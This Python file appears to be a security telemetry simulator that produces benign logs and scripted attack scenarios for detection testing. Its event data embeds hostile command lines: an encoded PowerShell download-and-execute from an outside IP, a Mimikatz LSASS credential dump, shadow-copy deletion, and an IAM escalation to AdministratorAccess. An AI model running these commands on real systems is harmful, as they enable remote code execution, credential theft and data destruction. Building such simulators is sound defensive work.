import random
import time
from datetime import datetime
from typing import Dict, Any, List

class SecurityTelemetryGenerator:
    """
    Simulates continuous enterprise security telemetry & specific adversary attack scenarios
    """
    def __init__(self):
        self.attack_scenarios = [
            {
                "id": "SCENARIO_COBALT_STRIKE",
                "name": "Cobalt Strike C2 Beaconing & Process Injection",
                "events": [
                    {
                        "source_type": "EDR",
                        "hostname": "PROD-DB-01",
                        "ip_address": "185.220.101.5",
                        "user_identity": "svc_backup_admin",
                        "process_name": "powershell.exe",
                        "command_line": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANQAvAGEAcAAxACcAKQA=",
                        "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
                    },
                    {
                        "source_type": "FIREWALL",
                        "hostname": "PROD-DB-01",
                        "ip_address": "185.220.101.5",
                        "raw_payload": {"dst_port": 443, "protocol": "TCP", "bytes_out": 4920}
                    }
                ]
            },
            {
                "id": "SCENARIO_MIMIKATZ_LSASS",
                "name": "Mimikatz LSASS Memory Dumping on Domain Controller",
                "events": [
                    {
                        "source_type": "EDR",
                        "hostname": "CORP-DC-01",
                        "ip_address": "10.0.1.10",
                        "user_identity": "local_admin",
                        "process_name": "mimikatz.exe",
                        "command_line": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" exit",
                        "file_hash": "d41d8cd98f00b204e9800998ecf8427e"
                    }
                ]
            },
            {
                "id": "SCENARIO_RANSOMWARE_STAGING",
                "name": "LockBit Ransomware File Staging & Shadow Copy Deletion",
                "events": [
                    {
                        "source_type": "EDR",
                        "hostname": "WS-FINANCE-12",
                        "ip_address": "10.0.8.44",
                        "user_identity": "finance_lead",
                        "process_name": "vssadmin.exe",
                        "command_line": "vssadmin.exe delete shadows /all /quiet",
                        "file_hash": "9f83c605d4a85f43d1f70f09b83724af"
                    }
                ]
            },
            {
                "id": "SCENARIO_CLOUD_IAM_ABUSE",
                "name": "Unauthorized Cloud IAM Role Privilege Escalation",
                "events": [
                    {
                        "source_type": "CLOUD_IAM",
                        "hostname": "APP-SERVER-04",
                        "ip_address": "91.240.118.172",
                        "user_identity": "app_deployer_role",
                        "process_name": "aws_cli",
                        "command_line": "aws iam attach-role-policy --role-name app_deployer --policy-arn arn:aws:iam::aws:policy/AdministratorAccess",
                        "raw_payload": {"cloud_provider": "AWS", "mfa_used": False}
                    }
                ]
            }
        ]

    def get_benign_event(self) -> Dict[str, Any]:
        """Generates benign baseline operational log"""
        hosts = ["APP-SERVER-04", "WS-FINANCE-12", "DEV-SANDBOX-09"]
        procs = [
            ("svchost.exe", "svchost.exe -k netsvcs -p", "SYSTEM"),
            ("explorer.exe", "C:\\Windows\\explorer.exe", "user_standard"),
            ("git.exe", "git.exe fetch origin main", "developer_bob"),
            ("chrome.exe", "chrome.exe --type=renderer", "user_alice")
        ]
        chosen_host = random.choice(hosts)
        chosen_proc = random.choice(procs)
        
        return {
            "event_id": f"EVT-BENIGN-{random.randint(1000, 9999)}",
            "timestamp": datetime.now().isoformat(),
            "source_type": "SIEM_BASELINE",
            "hostname": chosen_host,
            "ip_address": "10.0.2.15",
            "user_identity": chosen_proc[2],
            "process_name": chosen_proc[0],
            "command_line": chosen_proc[1],
            "file_hash": None,
            "raw_payload": {"status": "NORMAL_TELEMETRY"}
        }

    def trigger_attack_scenario(self, scenario_id: str) -> List[Dict[str, Any]]:
        """Returns the series of events for an adversary attack scenario"""
        for sc in self.attack_scenarios:
            if sc["id"] == scenario_id:
                events = []
                for ev in sc["events"]:
                    e_copy = dict(ev)
                    e_copy["event_id"] = f"EVT-{random.randint(10000, 99999)}"
                    e_copy["timestamp"] = datetime.now().isoformat()
                    events.append(e_copy)
                return events
        return [self.get_benign_event()]

    def list_available_scenarios(self) -> List[Dict[str, str]]:
        return [{"id": sc["id"], "name": sc["name"]} for sc in self.attack_scenarios]

telemetry_generator = SecurityTelemetryGenerator()
